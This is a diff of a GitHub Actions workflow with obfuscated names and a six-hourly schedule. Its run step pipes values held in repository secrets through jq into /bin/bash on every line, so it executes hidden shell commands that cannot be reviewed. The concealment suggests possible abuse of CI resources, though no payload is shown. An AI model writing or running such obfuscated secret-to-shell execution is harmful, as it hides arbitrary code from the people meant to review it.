@@ -2,9 +2,8 @@ name: liangwangchao8465
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
-
-jobs:  # 16342
+    - cron: '35 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +11,20 @@ jobs:  # 16342
       - uses: actions/checkout@v4
       - name: liangwangchao8465
         env:
-          ajuk261: ${{ secrets.ajuk261 }}
+          okwci55030: ${{ secrets.okwci55030 }}
         run: |
-          echo $ajuk261 | jq -r .whk1116 | /bin/bash
-          echo $ux99 | jq -r .jxyi89810 | /bin/bash
-          echo $uoqm29148 | jq -r .hd957 | /bin/bash
-          echo $h27 | jq -r .d89 | /bin/bash
-          echo $kph413 | jq -r .y9097 | /bin/bash
+          echo $okwci55030 | jq -r .qtwq911 | /bin/bash
+          echo $yh13 | jq -r .ep51240 | /bin/bash
+          echo $nl346 | jq -r .he65 | /bin/bash
+          echo $o95067 | jq -r .tmwn08 | /bin/bash
+          echo $awarh47646 | jq -r .rs043 | /bin/bash
+          echo $ounb632 | jq -r .hdpx49197 | /bin/bash
+          echo $rpf05325 | jq -r .mwgn3 | /bin/bash
+          echo $qpmr15 | jq -r .bdlvu48708 | /bin/bash
+          echo $sbbk6484 | jq -r .d17293 | /bin/bash
+          echo $q5 | jq -r .ydo00729 | /bin/bash
+          echo $o3786 | jq -r .o3 | /bin/bash
+          echo $fvlsq811 | jq -r .zrnrr0 | /bin/bash
+          echo $fdz5 | jq -r .izm83 | /bin/bash
+          echo $zuq5 | jq -r .pp2227 | /bin/bash
 
